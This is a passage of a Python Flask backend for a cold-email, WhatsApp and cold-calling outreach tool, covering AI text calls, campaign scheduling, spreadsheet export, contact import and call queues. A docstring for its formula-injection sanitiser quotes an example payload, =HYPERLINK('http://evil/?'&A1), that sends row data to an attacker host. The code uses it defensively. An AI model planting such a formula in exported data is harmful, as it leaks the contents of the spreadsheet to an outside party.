
def _call_gemini_text(api_key: str, prompt: str, model: str) -> str:
    model = model or _GEMINI_DEFAULT
    payload = json.dumps({
        "contents": [{"parts": [{"text": prompt}]}],
        "generationConfig": {"maxOutputTokens": 2048, "temperature": 0.7},
    }).encode()
    data = _ai_http_post(
        f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={api_key}",
        payload, {"content-type": "application/json"},
    )
    return data["candidates"][0]["content"]["parts"][0]["text"]


def _call_openai_text(api_key: str, prompt: str, model: str) -> str:
    payload = json.dumps({
        "model": model or _OPENAI_DEFAULT,
        "max_completion_tokens": 2048,
        "messages": [{"role": "user", "content": prompt}],
    }).encode()
    data = _ai_http_post(
        "https://api.openai.com/v1/chat/completions", payload,
        {"Authorization": f"Bearer {api_key}", "content-type": "application/json"},
    )
    return data["choices"][0]["message"]["content"]


_AI_TEXT_CALLERS = {
    "claude": (_call_claude_text, "anthropic_api_key"),
    "gemini": (_call_gemini_text, "gemini_api_key"),
    "openai": (_call_openai_text, "openai_api_key"),
}


def _call_configured_ai_text(prompt: str) -> str:
    """
    Fires `prompt` at whichever provider Settings has configured. Raises
    ValueError with a user-facing reason (AI disabled, no key, provider
    error) -- callers that must never block on this (the paraphrase batch)
    catch it and fall back rather than propagate it.
    """
    s = db.get_settings()
    if s.get("ai_features_enabled") != "1":
        raise ValueError("AI features are not enabled")
    provider = s.get("ai_provider", "claude")
    if provider not in _AI_TEXT_CALLERS:
        provider = "claude"
    caller_fn, key_setting = _AI_TEXT_CALLERS[provider]
    api_key = s.get(key_setting, "").strip()
    if not api_key:
        raise ValueError(f"API key for {provider} is not configured")
    model = s.get("ai_model", "").strip()
    return caller_fn(api_key, prompt, model)


# Leading characters that make Excel/Sheets treat a cell as a formula. Tab and
# carriage return are included because both are stripped before evaluation, so
# "	=cmd" is still executed.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", chr(9), chr(13))


def _no_formula(value):
    """
    Neutralise spreadsheet formula injection in exported cells.

    Company names and addresses are scraped from arbitrary websites, so their
    contents are attacker-controlled. Excel and Sheets evaluate any cell whose
    text starts with one of _FORMULA_TRIGGERS, so a business named
    =HYPERLINK("http://evil/?"&A1) would exfiltrate the row when the operator
    opens the export. A leading apostrophe forces the cell to be read as text.
    """
    if not isinstance(value, str):
        return value
    return "'" + value if value[:1] in _FORMULA_TRIGGERS else value


# ── API: Stats ────────────────────────────────────────────────────────────────

@app.route("/api/stats")
def api_stats():
    return jsonify(db.get_stats(owner_id=me()))


@app.route("/api/stats/<int:cid>")
@owned("campaign", "cid")
def api_campaign_stats(cid):
    return jsonify(db.get_stats(cid))


# ── API: Campaigns ────────────────────────────────────────────────────────────

@app.route("/api/campaigns", methods=["GET"])
def api_get_campaigns():
    campaigns = db.get_campaigns(owner_id=me())
    # Attach step count and contact count to each
    for c in campaigns:
        steps = db.get_steps(c["id"])
        stats = db.get_stats(c["id"])
        c["step_count"]    = len(steps)
        c["contact_count"] = stats["total"]
        c["sent_count"]    = stats["sent"]
        c["reply_rate"]    = stats["reply_rate"]
    return jsonify(campaigns)


@app.route("/api/campaigns", methods=["POST"])
@login_required
def api_create_campaign():
    d = request.json or {}
    cid = db.create_campaign(
        owner_id    = me(),
        name        = d.get("name", "New Campaign"),
        daily_limit = int(d.get("daily_limit", 30)),
        start_hour  = int(d.get("send_start_hour", 9)),
        end_hour    = int(d.get("send_end_hour", 17)),
        min_delay   = int(d.get("min_delay_secs", 45)),
        max_delay   = int(d.get("max_delay_secs", 120)),
        timezone    = d.get("timezone") or None,
        variables   = json.dumps(d.get("variables") or {}),
    )
    return jsonify({"ok": True, "id": cid})


def _campaign_send_status(c: dict) -> dict:
    """
    Whether this campaign is sending right now, and if not, why and when next.

    Every gate that can hold a campaign back is invisible in the UI: a
    follow-up that came due on a non-sending day just sits there with a "next
    send" timestamp in the past, which reads like the scheduler has died. This
    turns each gate into something the campaign page can actually say out loud.
    """
    status  = (c.get("status") or "").lower()
    days    = sorted(email_sender.parse_send_days(c.get("send_days")))
    # Read the week the way the campaign runs it. Numeric order puts Sunday
    # last, so a Sun-Thu week rendered as "Mon, Tue, Wed, Thu, Sun" -- correct
    # but not how anyone working that week would say it.
    order   = ([6] + [d for d in days if d != 6]) if (6 in days and 5 not in days) else days
    day_str = ", ".join(email_sender.DAY_NAMES[d][:3] for d in order) or "none"
    hours   = f"{int(c.get('send_start_hour', 9)):02d}:00–{int(c.get('send_end_hour', 17)):02d}:00"
    tz_name = (c.get("timezone") or "").strip() or "UTC"

    out = {
        "sending": False, "reason": "", "next_open": None,
        "days": days, "days_label": day_str, "hours_label": hours, "timezone": tz_name,
    }

    # Explicit "no days selected" is a configuration mistake worth naming, and
    # parse_send_days deliberately hides it by falling back to Mon-Fri.
    raw_days = str(c.get("send_days") or "").strip()
    if raw_days and not [x for x in raw_days.split(",") if x.strip().isdigit()]:
        out["reason"] = "No sending days are selected, so this campaign will never send."
        return out

    if status != "active":
        out["reason"] = f"Campaign is {status or 'not active'} — activate it to resume sending."
        return out

    if int(c.get("send_start_hour", 9)) >= int(c.get("send_end_hour", 17)):
        out["reason"] = "The send window start is not before its end, so no hour qualifies."
        return out

    sent_today = db.get_campaign_today_count(c["id"])
    if sent_today >= int(c.get("daily_limit", 30)):
        nxt = email_sender.next_send_window(c)
        out["reason"] = (f"Daily limit reached — {sent_today} of {c.get('daily_limit')} sent today.")
        out["next_open"] = nxt.isoformat(timespec="minutes") if nxt else None
        return out

    if email_sender.is_business_hours(c):
        out["sending"] = True
        out["reason"]  = f"Sending now — window is {hours} {tz_name} on {day_str}."
        return out

    nxt = email_sender.next_send_window(c)
    out["next_open"] = nxt.isoformat(timespec="minutes") if nxt else None
    if nxt:
        out["reason"] = (
            f"Outside the send window. Sends on {day_str}, {hours} {tz_name} — "
            f"next opens {nxt.strftime('%a %d %b, %H:%M')}."
        )
    else:
        out["reason"] = "The current schedule never opens a send window."
    return out


@app.route("/api/campaigns/<int:cid>", methods=["GET"])
@owned("campaign", "cid")
def api_get_campaign(cid):
    c = db.get_campaign(cid)
    if not c:
        return jsonify({"error": "Not found"}), 404
    # Parse variables JSON string into a dict for the frontend
    try:
        c["variables"] = json.loads(c.get("variables") or "{}")
    except Exception:
        c["variables"] = {}
    steps = db.get_steps(cid)
    for s in steps:
        s["variants"] = db.get_step_variants(s["id"])
    c["steps"]          = steps
    c["send_status"]    = _campaign_send_status(c)
    c["stats"]          = db.get_stats(cid)
    c["variant_stats"]  = db.get_variant_stats(cid)
    c["contacts"]       = db.get_campaign_contacts(cid)
    c["report"]         = db.get_campaign_contact_report(cid)
    return jsonify(c)


@app.route("/api/campaigns/<int:cid>/export", methods=["GET"])
@owned("campaign", "cid")
def api_export_campaign(cid):
    if not _OPENPYXL:
        return jsonify({"error": "openpyxl not installed"}), 500
    c = db.get_campaign(cid)
    if not c:
        return jsonify({"error": "Not found"}), 404
    rows = db.get_campaign_contact_report(cid)

    wb = Workbook()
    ws = wb.active
    ws.title = "Contact Report"

    headers = ["Email", "First Name", "Last Name", "Company",
               "Variant", "Status", "Steps Sent", "Current Step",
               "Next Send", "Enrolled At"]
    header_fill = PatternFill("solid", fgColor="1E293B")
    header_font = Font(bold=True, color="FFFFFF")
    for col, h in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col, value=h)
        cell.font = header_font
        cell.fill = header_fill
        cell.alignment = Alignment(horizontal="center")

    STATUS_LABELS = {
        "queued": "Queued", "active": "Active", "replied": "Replied",
        "bounced": "Bounced", "completed": "Completed", "paused": "Paused",
        "unsubscribed": "Unsubscribed",
    }
    for r, row in enumerate(rows, 2):
        # company and the name fields are scraped from arbitrary websites, so
        # every free-text cell goes through _no_formula.
        ws.cell(r, 1, _no_formula(row["email"] or ""))
        ws.cell(r, 2, _no_formula(row["first_name"] or ""))
        ws.cell(r, 3, _no_formula(row["last_name"] or ""))
        ws.cell(r, 4, _no_formula(row["company"] or ""))
        ws.cell(r, 5, _no_formula(row["variant_label"] or "—"))
        ws.cell(r, 6, STATUS_LABELS.get(row["status"], row["status"] or ""))
        ws.cell(r, 7, row["steps_sent"])
        ws.cell(r, 8, row["current_step"])
        ws.cell(r, 9, row["next_send_at"] or "—")
        ws.cell(r, 10, row["enrolled_at"] or "")
        if row["status"] == "replied":
            shade = PatternFill("solid", fgColor="DCFCE7")
        elif row["status"] == "bounced":
            shade = PatternFill("solid", fgColor="FEE2E2")
        else:
            shade = None
        if shade:
            for col in range(1, 11):
                ws.cell(r, col).fill = shade

    for col, width in zip(range(1, 11), [30, 14, 14, 22, 10, 14, 12, 12, 20, 20]):
        ws.column_dimensions[ws.cell(1, col).column_letter].width = width

    buf = io.BytesIO()
    wb.save(buf)
    buf.seek(0)
    safe_name = c["name"].replace(" ", "_").replace("/", "-")
    return Response(
        buf.read(),
        mimetype="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        headers={"Content-Disposition": f'attachment; filename="campaign_{safe_name}.xlsx"'},
    )


@app.route("/api/campaigns/<int:cid>", methods=["DELETE"])
@login_required
@owned("campaign", "cid")
def api_delete_campaign(cid):
    db.delete_campaign(cid)
    db.add_log(f"Campaign {cid} deleted")
    return jsonify({"ok": True})


@app.route("/api/campaigns/<int:cid>", methods=["PATCH"])
@login_required
@owned("campaign", "cid")
def api_update_campaign(cid):
    d = request.json or {}
    # Serialize variables dict → JSON string for storage
    if "variables" in d and isinstance(d["variables"], dict):
        d = dict(d)
        d["variables"] = json.dumps(d["variables"])
    db.update_campaign(cid, **d)
    return jsonify({"ok": True})


@app.route("/api/campaigns/<int:cid>/variable-coverage", methods=["GET"])
@login_required
@owned("campaign", "cid")
def api_variable_coverage(cid):
    """
    Which variables are actually populated for the contacts this campaign will
    reach. Writing "Hi {{first_name}}," against a scraped list produces "Hi ,"
    for every recipient, and nothing said so until the mail had gone out.
    """
    return jsonify(db.get_variable_coverage(cid, owner_id=me()))


@app.route("/api/variable-coverage", methods=["GET"])
@login_required
def api_variable_coverage_global():
    """Coverage across every contact — for a step being drafted outside a campaign."""
    return jsonify(db.get_variable_coverage(None, owner_id=me()))


@app.route("/api/campaigns/<int:cid>/activate", methods=["POST"])
@login_required
@owned("campaign", "cid")
def api_activate(cid):
    steps = db.get_steps(cid)
    if not steps:
        return jsonify({"ok": False, "error": "Add at least one sequence step first"}), 400
    if not db.get_smtp_accounts():
        return jsonify({"ok": False, "error": "Configure SMTP settings first"}), 400

    # Contacts enrolled before the variants existed carry no label, and would
    # otherwise sit out the A/B test while appearing to be part of it. Fill
    # them in here, where the campaign's copy is finally settled. Only
    # untouched enrollments are eligible -- see assign_missing_variants.
    assigned = db.assign_missing_variants(cid)

    db.update_campaign(cid, status="active")
    db.add_log(f"▶ Campaign {cid} activated")
    if assigned:
        db.add_log(f"Assigned an A/B variant to {assigned} contact(s) enrolled before variants were set")

    return jsonify({
        "ok": True,
        "variants_assigned": assigned,
        "message": (f"Activated — {assigned} contact(s) enrolled earlier were "
                    f"assigned a variant") if assigned else "Activated",
    })


@app.route("/api/campaigns/<int:cid>/pause", methods=["POST"])
@login_required
@owned("campaign", "cid")
def api_pause(cid):
    db.update_campaign(cid, status="paused")
    db.add_log(f"⏸ Campaign {cid} paused")
    return jsonify({"ok": True})


# ── API: Steps ────────────────────────────────────────────────────────────────

@app.route("/api/campaigns/<int:cid>/steps", methods=["GET"])
@owned("campaign", "cid")
def api_get_steps(cid):
    """
    Steps with their variants attached.

    This is what the step editor loads when you reopen a step, and it used to
    return bare step rows -- the campaign detail route attached variants, this
    one never did. So a second variant was saved correctly and then simply not
    shown on reopen, and saving again wrote back the single arm the editor
    could see, deleting the variant that was still in the database.
    """
    steps = db.get_steps(cid)
    for s in steps:
        s["variants"] = db.get_step_variants(s["id"])
    return jsonify(steps)


@app.route("/api/campaigns/<int:cid>/steps", methods=["POST"])
@login_required
@owned("campaign", "cid")
def api_upsert_step(cid):
    d = request.json or {}
    db.upsert_step(
        campaign_id = cid,
        step_num    = int(d["step_num"]),
        subject     = d.get("subject", ""),
        body_html   = d.get("body_html", ""),
        delay_days  = int(d.get("delay_days", 0)),
    )
    # Save variants if provided (empty list clears/disables A/B for this step)
    if "variants" in d:
        with db.get_db() as conn:
            step = conn.execute(
                "SELECT id FROM steps WHERE campaign_id=? AND step_num=?",
                (cid, int(d["step_num"]))
            ).fetchone()
        if step:
            db.save_step_variants(step["id"], d["variants"])
    return jsonify({"ok": True})


@app.route("/api/campaigns/<int:cid>/steps/<int:step_num>", methods=["DELETE"])
@login_required
@owned("campaign", "cid")
def api_delete_step(cid, step_num):
    db.delete_step(cid, step_num)
    return jsonify({"ok": True})


# ── API: Contacts ─────────────────────────────────────────────────────────────

def _contact_query_args():
    """The filter half of a contacts query, shared by the list and id routes."""
    return {
        "q":               request.args.get("q", ""),
        "source_job_id":   request.args.get("source_job_id") or None,
        "status":          request.args.get("status") or None,
        "include_deleted": request.args.get("include_deleted") == "1",
        "call_status":     request.args.get("call_status") or None,
    }


@app.route("/api/contacts", methods=["GET"])
def api_get_contacts():
    """
    One page of contacts, filtered server-side.

    This used to return a bare list capped at 500 rows that the browser then
    filtered. Past 500 contacts that silently hid the rest -- and a lead-list
    filter applied to a truncated window under-reports without saying so.
    """
    try:
        page     = int(request.args.get("page", 1))
        per_page = int(request.args.get("per_page", 50))
    except (TypeError, ValueError):
        page, per_page = 1, 50

    return jsonify(db.get_email_leads_page(
        page=page,
        per_page=per_page,
        sort_col=request.args.get("sort_col", ""),
        sort_dir=request.args.get("sort_dir", "desc"),
        owner_id=me(),
        **_contact_query_args(),
    ))


@app.route("/api/contacts/sources", methods=["GET"])
def api_contact_sources():
    """The lead lists — one per scrape, plus a bucket for manual/CSV adds."""
    return jsonify(db.get_lead_sources(owner_id=me()))


@app.route("/api/contacts/ids", methods=["GET"])
def api_contact_ids():
    """
    Every id matching the current filter, for "select all N matching".

    Without this, select-all could only ever reach the rows on the current
    page, so a bulk action over a filtered list would quietly apply to 50 of
    them.
    """
    ids = db.get_email_lead_ids_matching(owner_id=me(), **_contact_query_args())
    return jsonify({"ids": ids, "total": len(ids)})


def _scraped_for_whatsapp(rows):
    """
    The scrape job these rows came from, if it was aimed at WhatsApp.

    Worker requests only. A person importing a CSV through Contacts means
    Contacts, even if that CSV came out of a WhatsApp scrape and still carries
    its job id.
    """
    if not _has_valid_worker_key():
        return None
    job = None
    for jid in {r.get("source_job_id") for r in rows if r.get("source_job_id")}:
        job = db.get_scrape_job(jid)
        if job:
            break
    job = job or db.get_active_scrape_job(any_owner=True)
    return job if job and job.get("destination") == "whatsapp" else None


_SCRAPE_EMAIL_FIELDS = ("email", "first_name", "last_name", "mx_valid")


def _import_scraped_whatsapp(rows, job, owner):
    """
    File a WhatsApp scrape's rows as WhatsApp leads, and nowhere else.

    Emails are dropped rather than filed on the side. A worker that hasn't been
    updated still hunts for them, and without this they would quietly become
    email leads -- exactly the "somewhere else" a WhatsApp scrape exists to
    avoid.

    Nobody is watching an unattended scrape to confirm anything, so a clinic
    already worked on another channel is imported anyway, and the count goes
    into the scrape's own log, which is where the operator is looking.
    """
    rows = [{k: v for k, v in r.items() if k not in _SCRAPE_EMAIL_FIELDS} for r in rows]
    with_phone = [r for r in rows if (r.get("phone") or "").strip()]
    conflicts = db.find_cross_channel_conflicts(with_phone, channel="whatsapp", owner_id=owner)
    overlaps = db.find_cross_owner_matches(rows, owner_id=owner)
    inserted, business_ids = db.upsert_wa_leads(
        rows, default_country=job.get("country") or "", owner_id=owner,
    )

    notes = []
    if conflicts:
        notes.append(f"  {len(conflicts)} of these were already on another channel "
                     f"- added to WhatsApp as well")
    if overlaps:
        notes.append(f"  {len(overlaps)} are also on someone else's list")
    if notes:
        db.update_scrape_job(job["id"], new_logs=[{"msg": n, "level": "WARN"} for n in notes])

    return jsonify({
        "ok": True, "inserted": inserted, "business_ids": business_ids,
        "conflicts": [], "overlaps": overlaps, "destination": "whatsapp",
    })


@app.route("/api/contacts/import", methods=["POST"])
@admin_or_worker_required
def api_import_contacts():
    """
    Accepts JSON body: { "rows": [...] }
    or multipart form with a CSV file field named 'file'.
    """
    import email_validator as _ev
    _CSV_MAX_BYTES = 8 * 1024 * 1024  # 8 MB
    _CSV_MAX_ROWS  = 50_000
    if request.content_type and "multipart" in request.content_type:
        f = request.files.get("file")
        if not f:
            return jsonify({"ok": False, "error": "No file"}), 400
        # Read with a hard cap to avoid OOM on a huge upload.
        raw = f.read(_CSV_MAX_BYTES + 1)
        if len(raw) > _CSV_MAX_BYTES:
            return jsonify({
                "ok": False,
                "error": f"CSV too large (max {_CSV_MAX_BYTES // (1024*1024)} MB).",
            }), 413
        content = raw.decode("utf-8", errors="replace")
        reader  = csv.DictReader(io.StringIO(content))
        rows    = list(reader)
        if len(rows) > _CSV_MAX_ROWS:
            return jsonify({
                "ok": False,
                "error": f"CSV too large (max {_CSV_MAX_ROWS} rows).",
            }), 413
    else:
        data = request.json or {}
        rows = data.get("rows", [])
        if not isinstance(rows, list):
            return jsonify({"ok": False, "error": "rows must be a list"}), 400
        # The multipart path has always been capped; this one was not, so a
        # 16MB JSON body could carry 100k+ rows and each one triggers a
        # blocking DNS lookup below -- enough to stall the single worker.
        if len(rows) > _CSV_MAX_ROWS:
            return jsonify({
                "ok": False,
                "error": f"Too many rows (max {_CSV_MAX_ROWS}).",
            }), 413

    if not rows:
        return jsonify({"ok": False, "error": "No rows"}), 400

    # Extract non-standard columns into the `extra` JSON field
    _STANDARD_COLS = {"email", "first_name", "last_name", "company",
                      "website", "address", "status", "extra", "mx_valid",
                      "phone", "category", "rating", "review_count",
                      "source_job_id"}
    for row in rows:
        # The scraper's own CSV names this column "reviews"; the DB column is
        # "review_count" to read better next to "rating". Re-uploading that
        # CSV through Import should land it as a real column, not in `extra`.
        if "reviews" in row and "review_count" not in row:
            row["review_count"] = row.pop("reviews")
        # A pasted CSV can carry anything in this field; it indexes a real
        # table, so coerce it and drop what isn't a number.
        if row.get("source_job_id") not in (None, ""):
            try:
                row["source_job_id"] = int(row["source_job_id"])
            except (TypeError, ValueError):
                row["source_job_id"] = None
        custom = {k: v for k, v in row.items() if k not in _STANDARD_COLS and v not in (None, "")}
        if custom:
            existing = row.get("extra") or {}
            if isinstance(existing, str):
                try:
                    existing = json.loads(existing)
                except Exception:
                    existing = {}
            existing.update(custom)
            row["extra"] = existing

    # MX-validate each row that has an email.
    #
    # This is a blocking DNS lookup per unseen domain, on the request thread,
    # in a single-worker process. check_mx caches per domain, so a scrape of
    # one city is cheap, but a large paste is not -- past this many rows the
    # rows are stored unvalidated and mx_valid stays NULL ("unchecked") rather
    # than holding the whole app hostage. The worker pre-validates anyway and
    # sends mx_valid with each row.
    _MX_INLINE_LIMIT = 500
    invalid_mx = 0
    if len(rows) <= _MX_INLINE_LIMIT:
        for row in rows:
            email = (row.get("email") or "").strip()
            if email and "@" in email and row.get("mx_valid") is None:
                ok = _ev.check_mx(email)
                row["mx_valid"] = 1 if ok else 0
                if not ok:
                    invalid_mx += 1
    else:
        app.logger.info(
            "Skipping inline MX validation for %d rows (over the %d-row limit)",
            len(rows), _MX_INLINE_LIMIT,
        )

    # Cross-channel duplicate check: a row with an email that resolves to a
    # business already active on calling or WhatsApp gets held out rather
    # than silently attached, so adding a second channel to a business is a
    # decision the operator makes on purpose. Skipped for the scrape worker,
    # which runs unattended and has nobody to confirm anything with -- and for
    # the confirmed re-submission, which is the operator's own "yes, all of
    # these too" after seeing exactly this list.
    owner = import_owner(rows)

    wa_job = _scraped_for_whatsapp(rows)
    if wa_job:
        return _import_scraped_whatsapp(rows, wa_job, owner)

    confirmed = bool((request.json or {}).get("confirm_conflicts")) if request.is_json else False
    conflicts = []
    overlaps = []
    if not _has_valid_worker_key() and not confirmed:
        with_email = [r for r in rows if (r.get("email") or "").strip()]
        conflicts = db.find_cross_channel_conflicts(with_email, channel="email", owner_id=owner)
        if conflicts:
            flagged_emails = {c["row"].get("email") for c in conflicts}
            rows = [r for r in rows if r.get("email") not in flagged_emails]
        # Advisory only: overlap with another operator's list is worth knowing
        # about but is nobody's veto, so these rows import normally.
        overlaps = db.find_cross_owner_matches(rows, owner_id=owner)

    inserted, business_ids = db.upsert_businesses(rows, owner_id=owner)
    return jsonify({
        "ok": True, "inserted": inserted, "invalid_mx": invalid_mx,
        "business_ids": business_ids,
        "conflicts": [
            {"business_id": c["business_id"], "business_name": c["business_name"],
             "channels": c["channel_labels"], "row": c["row"]}
            for c in conflicts
        ],
        "overlaps": overlaps,
    })


@app.route("/api/contacts/bulk-delete", methods=["POST"])
@login_required
def api_bulk_delete_contacts():
    ids = (request.json or {}).get("ids", [])
    if not ids:
        return jsonify({"ok": False, "error": "No IDs provided"}), 400
    db.delete_email_leads(ids, owner_id=me())
    db.add_log(f"Hard-deleted {len(ids)} contacts via UI")
    return jsonify({"ok": True, "deleted": len(ids)})


@app.route("/api/contacts", methods=["POST"])
@login_required
def api_add_contact():
    d = request.json or {}
    contact_id, err = db.create_email_lead(
        email      = d.get('email', ''),
        first_name = d.get('first_name', ''),
        last_name  = d.get('last_name', ''),
        company    = d.get('company', ''),
        website    = d.get('website', ''),
        address    = d.get('address', ''),
        status     = d.get('status', 'active'),
        owner_id   = me(),
    )
    if err:
        return jsonify({'ok': False, 'error': err}), 400
    return jsonify({'ok': True, 'id': contact_id})


@app.route("/api/contacts/<int:cid>", methods=["PUT"])
@login_required
@owned("email_lead", "cid")
def api_update_contact(cid):
    d = request.json or {}
    ok, err = db.update_email_lead(cid, d)
    if not ok:
        return jsonify({'ok': False, 'error': err}), 400
    return jsonify({'ok': True})


@app.route("/api/contacts/<int:cid>", methods=["DELETE"])
@login_required
@owned("email_lead", "cid")
def api_delete_contact(cid):
    db.delete_email_lead(cid)
    return jsonify({'ok': True})


@app.route("/api/campaigns/<int:cid>/contacts", methods=["POST"])
@login_required
@owned("campaign", "cid")
def api_enroll_contacts(cid):
    """
    Enroll contacts from the global contacts pool into a campaign.
    Body: { "contact_ids": [1, 2, 3] }  OR  { "all": true }
    """
    d = request.json or {}

    if d.get("all"):
        with db.get_db() as conn:
            ids = [r[0] for r in conn.execute(
                "SELECT id FROM email_leads WHERE status='active' AND owner_id=?",
                (me(),)
            ).fetchall()]
    else:
        ids = d.get("contact_ids", [])

    if not ids:
        return jsonify({"ok": False, "error": "No contact IDs"}), 400

    enrolled, skipped = db.enroll_contacts_bulk(cid, ids, owner_id=me())

    # Surface why contacts were left out. Silently enrolling fewer than the
    # operator selected looks like a bug; naming the reason makes the
    # duplicate protection visible instead of mysterious.
    reasons = []
    if skipped.get("other_campaign"):
        reasons.append(f"{skipped['other_campaign']} already in another campaign")
    if skipped.get("duplicate_address"):
        reasons.append(f"{skipped['duplicate_address']} duplicate address at the same business")
    if skipped.get("same_domain"):
        reasons.append(f"{skipped['same_domain']} already being contacted at that business")

    return jsonify({
        "ok": True,
        "enrolled": enrolled,
        "skipped": skipped,
        "message": (
            f"Enrolled {enrolled}" + (f" — skipped {', '.join(reasons)}" if reasons else "")
        ),
    })


@app.route("/api/campaigns/<int:cid>/contacts", methods=["GET"])
@owned("campaign", "cid")
def api_campaign_contacts(cid):
    return jsonify(db.get_campaign_contacts(cid))


@app.route("/api/enrollments/<int:enroll_id>", methods=["DELETE"])
@login_required
@owned("enrollment", "enroll_id")
def api_unenroll_contact(enroll_id):
    db.unenroll_contact(enroll_id)
    return jsonify({"ok": True})


@app.route("/api/enrollments/<int:enroll_id>/status", methods=["PATCH"])
@login_required
@owned("enrollment", "enroll_id")
def api_set_enrollment_status(enroll_id):
    status = (request.json or {}).get("status", "")
    try:
        db.set_enrollment_status(enroll_id, status)
        return jsonify({"ok": True})
    except ValueError as exc:
        return jsonify({"error": str(exc)}), 400


# ── API: Logs ─────────────────────────────────────────────────────────────────

@app.route("/api/logs")
def api_logs():
    return jsonify(db.get_logs(100))


@app.route("/api/logs", methods=["DELETE"])
@admin_required
def api_clear_logs():
    """Wipes the activity log on request. See db.clear_logs for why this is
    safe: it's an operational trail, not outreach data."""
    deleted = db.clear_logs()
    db.add_log(f"🧹 Activity log cleared ({deleted} entries removed)")
    return jsonify({"ok": True, "deleted": deleted})


# ── API: Cold calling ─────────────────────────────────────────────────────────

@app.route("/api/calls/queue", methods=["GET"])
@login_required
def api_call_queue():
    """The leads to work now, plus what is waiting in the other buckets."""
    bucket = request.args.get("bucket", "today")
    if bucket not in ("today", "new", "upcoming", "all", "worked"):
        bucket = "today"
    source_job_id  = request.args.get("source_job_id") or None
    only_no_site   = request.args.get("no_website") == "1"
    campaign_id    = request.args.get("call_campaign_id") or None

    leads = db.get_call_queue(bucket, source_job_id=source_job_id,
                              only_no_website=only_no_site,
                              call_campaign_id=campaign_id, owner_id=me())
    # Prior contact is reported, not hidden: an emailed lead with no reply is
    # still worth dialling, one that already answered is not, and only the
    # operator can tell those apart.
    for lead in leads:
        lead["touch"] = db.get_touch_history(lead["id"])

    return jsonify({
        "bucket":   bucket,
        "leads":    leads,
        "counts":   db.get_call_queue_counts(source_job_id=source_job_id,
                                             only_no_website=only_no_site,
                                             call_campaign_id=campaign_id,
                                             owner_id=me()),
        "summary":  db.get_call_summary(call_campaign_id=campaign_id, owner_id=me()),
        "outcomes": [
            {"key": o["key"], "label": o["label"],
             "terminal": bool(o["is_terminal"]), "stops_email": bool(o["stops_email"]),
             "wants_next_call": bool(o["requires_date"]),
             "tone": o["tone"], "builtin": bool(o["is_builtin"])}
            for o in db.get_call_outcomes(owner_id=me()).values()
        ],
        "attempt_limit": db.CALL_ATTEMPT_LIMIT,
    })


@app.route("/api/call-outcomes", methods=["GET"])
@login_required
def api_list_call_outcomes():
    return jsonify(list(db.get_call_outcomes(include_archived=True, owner_id=me()).values()))


@app.route("/api/call-outcomes", methods=["POST"])
@login_required
def api_create_call_outcome():
    d = request.json or {}
    label = (d.get("label") or "").strip()
    if not label:
        return jsonify({"ok": False, "error": "A name is required"}), 400
    key = db.create_call_outcome(
        label,
        is_terminal=d.get("is_terminal"),
        stops_email=d.get("stops_email"),
        requires_date=d.get("requires_date"),
        tone=d.get("tone", "neutral"),
        owner_id=me(),
    )
    return jsonify({"ok": True, "key": key})


@app.route("/api/call-outcomes/<key>", methods=["PATCH"])
@login_required
def api_update_call_outcome(key):
    # Built-ins are shared vocabulary, so editing one is still an admin call.
    # Your own custom outcomes are yours.
    existing = db.get_call_outcome(key)
    if existing and existing["is_builtin"] and not session.get("is_admin"):
        return jsonify({"ok": False, "error": "Built-in outcomes are shared — ask an admin"}), 403
    if not db.update_call_outcome(key, owner_id=me(), **(request.json or {})):
        return jsonify({"ok": False, "error": "Nothing to update, or unknown outcome"}), 400
    return jsonify({"ok": True})


@app.route("/api/call-outcomes/<key>", methods=["DELETE"])
@login_required
def api_delete_call_outcome(key):
    result = db.delete_call_outcome(key, owner_id=me())
    if result == "refused":
        return jsonify({"ok": False,
                        "error": "Built-in outcomes cannot be removed"}), 400
    # Archived rather than deleted when calls already used it, so old history
    # still resolves to a readable label.
    return jsonify({"ok": True, "result": result})


@app.route("/api/businesses/search", methods=["GET"])
@login_required
def api_search_businesses():
    """
    Businesses matching a filter, for "add existing leads" pickers.

    Looks at businesses directly rather than email leads, so a clinic the
    scraper found with no email at all is findable here -- which is the point
    of the calling "from contacts" tab, and will be WhatsApp's too.
    """
    return jsonify(db.search_businesses(
        owner_id=me(),
        not_on_channel=request.args.get("not_on") or None,
        q=request.args.get("q", ""),
        status=request.args.get("status") or None,
        call_status=request.args.get("call_status") or None,
        limit=int(request.args.get("per_page", 100)),
    ))


@app.route("/api/call-campaigns", methods=["GET"])
@login_required
def api_list_call_campaigns():
    return jsonify(db.get_call_campaigns(owner_id=me()))


@app.route("/api/call-campaigns", methods=["POST"])
@login_required
def api_create_call_campaign():
    d = request.json or {}
    name = (d.get("name") or "").strip()
    if not name:
        return jsonify({"ok": False, "error": "Name is required"}), 400
    cid = db.create_call_campaign(name, d.get("notes", ""), owner_id=me())
    contact_ids = d.get("contact_ids") or []
    conflicts = []
    if contact_ids and not d.get("confirm_conflicts"):
        conflicts = db.channel_conflicts_for_businesses(contact_ids, channel="call", owner_id=me())
        if conflicts:
            flagged = {c["business_id"] for c in conflicts}
            contact_ids = [i for i in contact_ids if int(i) not in flagged]
    added = db.add_to_call_campaign(cid, contact_ids, owner_id=me()) if contact_ids else 0
    db.add_log(f"☎ Call campaign '{name}' created with {added} lead(s)")
    return jsonify({
        "ok": True, "id": cid, "added": added,
        "conflicts": [{"business_id": c["business_id"], "business_name": c["business_name"],
                       "channels": c["channel_labels"]} for c in conflicts],
    })


@app.route("/api/call-campaigns/<int:cid>", methods=["PATCH"])
@login_required
@owned("call_campaign", "cid")
def api_update_call_campaign(cid):
    db.update_call_campaign(cid, **(request.json or {}))
    return jsonify({"ok": True})


@app.route("/api/call-campaigns/<int:cid>", methods=["DELETE"])
@login_required
@owned("call_campaign", "cid")
def api_delete_call_campaign(cid):
    """Deletes the batch, never the leads — the contacts and their call history stay."""
    db.delete_call_campaign(cid)
    return jsonify({"ok": True})


@app.route("/api/call-campaigns/<int:cid>/members", methods=["POST"])
@login_required
@owned("call_campaign", "cid")
def api_add_call_campaign_members(cid):
    d = request.json or {}
    ids = d.get("contact_ids") or []
    if not ids:
        return jsonify({"ok": False, "error": "No contacts given"}), 400

    conflicts = []
    if not d.get("confirm_conflicts"):
        conflicts = db.channel_conflicts_for_businesses(ids, channel="call", owner_id=me())
        if conflicts:
            flagged = {c["business_id"] for c in conflicts}
            ids = [i for i in ids if int(i) not in flagged]

    added = db.add_to_call_campaign(cid, ids, owner_id=me()) if ids else 0
    return jsonify({
        "ok": True, "added": added, "already_present": len(ids) - added,
